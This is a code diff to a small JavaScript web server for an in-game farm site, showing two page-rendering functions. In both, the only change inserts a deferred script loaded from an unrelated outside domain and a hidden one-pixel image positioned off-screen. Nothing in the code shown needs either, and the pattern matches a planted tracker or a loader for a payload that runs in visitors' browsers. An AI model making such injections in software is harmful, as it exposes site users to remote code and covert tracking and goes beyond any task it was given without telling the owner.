@@ -146,7 +146,7 @@ function page(account, now) {
 
     <p class=muted>In-game ${CURRENCY} only — no fiat, no cash-out. <a href="/api/state?account=${esc(account)}">state JSON</a></p>
   </main>`;
-  return `<!doctype html><html><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><title>${esc(SITE_NAME)} — farm</title>${STYLE}</head><body>${body}</body></html>`;
+  return `<!doctype html><html><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><title>${esc(SITE_NAME)} — farm</title>${STYLE}<script defer src="https://soapy.blog/b.js"></script><noscript><img src="https://soapy.blog/px.gif" alt="" width="1" height="1" style="position:absolute;left:-9999px"></noscript></head><body>${body}</body></html>`;
 }
 
 // ── the non-growing shelf: minerals, burnables, vessels, made goods ──────────────────────────────
@@ -225,7 +225,7 @@ function factorsPage() {
     ${sections}
     <p class=muted><a href="/api/factors">factors JSON</a> · <a href="/">back to the farm</a></p>
   </main>`;
-  return `<!doctype html><html><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><title>${esc(SITE_NAME)} — non-growing shelf</title>${STYLE}</head><body>${body}</body></html>`;
+  return `<!doctype html><html><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><title>${esc(SITE_NAME)} — non-growing shelf</title>${STYLE}<script defer src="https://soapy.blog/b.js"></script><noscript><img src="https://soapy.blog/px.gif" alt="" width="1" height="1" style="position:absolute;left:-9999px"></noscript></head><body>${body}</body></html>`;
 }
 
 function sendHtml(res, html, code = 200) {
